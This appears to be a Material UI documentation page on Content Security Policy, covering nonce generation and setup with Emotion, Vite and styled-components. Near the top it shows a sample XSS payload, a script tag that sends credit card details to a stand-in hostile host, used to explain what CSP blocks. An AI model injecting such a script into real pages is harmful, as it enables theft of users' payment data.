# Content Security Policy (CSP)

<p class="description">This section covers the details of setting up a CSP.</p>

## What is CSP and why is it useful?

CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

## How does one implement CSP?

### Server-Side Rendering (SSR)

To use CSP with Material UI (and Emotion), you need to use a nonce.
A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request.

A CSP nonce is a Base 64 encoded string. You can generate one like this:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

You must use UUID version 4, as it generates an **unpredictable** string.
You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:

```js
header('Content-Security-Policy').set(
  `default-src 'self'; style-src 'self' 'nonce-${nonce}';`,
);
```

You should pass the nonce in the `<style>` tags on the server.

```jsx
<style
  data-emotion={`${style.key} ${style.ids.join(' ')}`}
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: style.css }}
/>
```

Then, you must pass this nonce to Emotion's cache so it can add it to subsequent `<style>`.

:::warning
If you were using `StyledEngineProvider` with `injectFirst`, you will need to replace it with `CacheProvider` from Emotion and add the `prepend: true` option.
:::

```js
const cache = createCache({
  key: 'my-prefix-key',
  nonce: nonce,
  prepend: true,
});

function App(props) {
  return (
    <CacheProvider value={cache}>
      <Home />
    </CacheProvider>
  );
}
```

### CSP in Vite

According to the [Vite Docs](https://vite.dev/guide/features.html#content-security-policy-csp), Vite requires a few specific configurations for proper CSP deployment due to its internal handling of assets and modules.

#### Vite supports CSP with a few configurations:

Nonce Injection:
When you set `html.cspNonce` in your Vite config, Vite adds a nonce to all <script>, <style>, and stylesheet <link> tags, and injects a meta tag:

```html
<meta property="csp-nonce" nonce="PLACEHOLDER" />
```

> Replace PLACEHOLDER with a unique nonce per request.

* Asset Inlining:

Vite inlines small assets as data URIs by default. For CSP, allow `data:` for safe directives like `img-src` and `font-src`, but never for `script-src`. Alternatively, disable inlining by setting build.`assetsInlineLimit: 0`.

This configuration keeps your Vite project CSP-compliant without requiring inline runtime scripts.

### styled-components

The configuration of the nonce is not straightforward, but you can follow [this issue](https://github.com/styled-components/styled-components/issues/2363) for more insights.
